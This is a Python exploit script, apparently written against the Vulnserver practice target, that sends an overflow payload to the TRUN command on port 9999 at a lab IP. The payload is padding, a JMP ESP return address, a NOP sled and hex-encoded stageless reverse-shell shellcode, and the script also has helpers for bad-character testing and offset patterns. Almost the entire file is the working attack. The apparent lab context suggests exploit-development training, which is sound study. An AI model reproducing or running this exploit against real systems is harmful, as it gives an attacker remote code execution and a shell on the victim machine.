import socket
import struct

def conv(address):
    return(struct.pack("<I", address))

def generate_badchar():
    badchar_test = b''
    badchars = [0x00, 0x0A, 0x0D]

    for i in range(0x00, 0xFF+1):
        if i not in badchars:
            badchar_test += struct.pack("B", i)

    with open("badchar_test.bin", "wb") as f:
        f.write(badchar_test)

    return(badchar_test)

def get_pattern():
    with open("pattern.txt", "rb") as f:
        return(f.read())

if __name__ == "__main__":
    IP = "192.168.56.134"
    PORT = 9999
    SIZE = 1024
    OFFSET = 2006
    JMP_ESP = conv(0x625011af)

    StagelessReverseShellCode =  b""
    StagelessReverseShellCode += b"\xd9\xec\xd9\x74\x24\xf4\x5a"
    StagelessReverseShellCode += b"\x31\xc9\xb8\xbb\x96\xb4\x74"
    StagelessReverseShellCode += b"\xb1\x52\x31\x42\x17\x83\xc2"
    StagelessReverseShellCode += b"\x04\x03\xf9\x85\x56\x81\x01"
    StagelessReverseShellCode += b"\x41\x14\x6a\xf9\x92\x79\xe2"
    StagelessReverseShellCode += b"\x1c\xa3\xb9\x90\x55\x94\x09"
    StagelessReverseShellCode += b"\xd2\x3b\x19\xe1\xb6\xaf\xaa"
    StagelessReverseShellCode += b"\x87\x1e\xc0\x1b\x2d\x79\xef"
    StagelessReverseShellCode += b"\x9c\x1e\xb9\x6e\x1f\x5d\xee"
    StagelessReverseShellCode += b"\x50\x1e\xae\xe3\x91\x67\xd3"
    StagelessReverseShellCode += b"\x0e\xc3\x30\x9f\xbd\xf3\x35"
    StagelessReverseShellCode += b"\xd5\x7d\x78\x05\xfb\x05\x9d"
    StagelessReverseShellCode += b"\xde\xfa\x24\x30\x54\xa5\xe6"
    StagelessReverseShellCode += b"\xb3\xb9\xdd\xae\xab\xde\xd8"
    StagelessReverseShellCode += b"\x79\x40\x14\x96\x7b\x80\x64"
    StagelessReverseShellCode += b"\x57\xd7\xed\x48\xaa\x29\x2a"
    StagelessReverseShellCode += b"\x6e\x55\x5c\x42\x8c\xe8\x67"
    StagelessReverseShellCode += b"\x91\xee\x36\xed\x01\x48\xbc"
    StagelessReverseShellCode += b"\x55\xed\x68\x11\x03\x66\x66"
    StagelessReverseShellCode += b"\xde\x47\x20\x6b\xe1\x84\x5b"
    StagelessReverseShellCode += b"\x97\x6a\x2b\x8b\x11\x28\x08"
    StagelessReverseShellCode += b"\x0f\x79\xea\x31\x16\x27\x5d"
    StagelessReverseShellCode += b"\x4d\x48\x88\x02\xeb\x03\x25"
    StagelessReverseShellCode += b"\x56\x86\x4e\x22\x9b\xab\x70"
    StagelessReverseShellCode += b"\xb2\xb3\xbc\x03\x80\x1c\x17"
    StagelessReverseShellCode += b"\x8b\xa8\xd5\xb1\x4c\xce\xcf"
    StagelessReverseShellCode += b"\x06\xc2\x31\xf0\x76\xcb\xf5"
    StagelessReverseShellCode += b"\xa4\x26\x63\xdf\xc4\xac\x73"
    StagelessReverseShellCode += b"\xe0\x10\x62\x23\x4e\xcb\xc3"
    StagelessReverseShellCode += b"\x93\x2e\xbb\xab\xf9\xa0\xe4"
    StagelessReverseShellCode += b"\xcc\x02\x6b\x8d\x67\xf9\xfc"
    StagelessReverseShellCode += b"\x72\xdf\x39\x97\x1a\x22\x39"
    StagelessReverseShellCode += b"\x76\x87\xab\xdf\x12\x27\xfa"
    StagelessReverseShellCode += b"\x48\x8b\xde\xa7\x02\x2a\x1e"
    StagelessReverseShellCode += b"\x72\x6f\x6c\x94\x71\x90\x23"
    StagelessReverseShellCode += b"\x5d\xff\x82\xd4\xad\x4a\xf8"
    StagelessReverseShellCode += b"\x73\xb1\x60\x94\x18\x20\xef"
    StagelessReverseShellCode += b"\x64\x56\x59\xb8\x33\x3f\xaf"
    StagelessReverseShellCode += b"\xb1\xd1\xad\x96\x6b\xc7\x2f"
    StagelessReverseShellCode += b"\x4e\x53\x43\xf4\xb3\x5a\x4a"
    StagelessReverseShellCode += b"\x79\x8f\x78\x5c\x47\x10\xc5"
    StagelessReverseShellCode += b"\x08\x17\x47\x93\xe6\xd1\x31"
    StagelessReverseShellCode += b"\x55\x50\x88\xee\x3f\x34\x4d"
    StagelessReverseShellCode += b"\xdd\xff\x42\x52\x08\x76\xaa"
    StagelessReverseShellCode += b"\xe3\xe5\xcf\xd5\xcc\x61\xd8"
    StagelessReverseShellCode += b"\xae\x30\x12\x27\x65\xf1\x32"
    StagelessReverseShellCode += b"\xca\xaf\x0c\xdb\x53\x3a\xad"
    StagelessReverseShellCode += b"\x86\x63\x91\xf2\xbe\xe7\x13"
    StagelessReverseShellCode += b"\x8b\x44\xf7\x56\x8e\x01\xbf"
    StagelessReverseShellCode += b"\x8b\xe2\x1a\x2a\xab\x51\x1a"
    StagelessReverseShellCode += b"\x7f"

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((IP, PORT))

        data = sock.recv(SIZE).decode()
        print(data)

        buf  = b"TRUN ." 
        buf += b"A" * OFFSET
        buf += JMP_ESP
        buf += b"\x90" * 32 #NOP
        buf += StagelessReverseShellCode
        buf += b"\r\n"

        sock.sendall(buf)
        data = sock.recv(SIZE).decode()
        print(data)

        sock.close()
    except Exception as err:
        print(f"Error : {err}")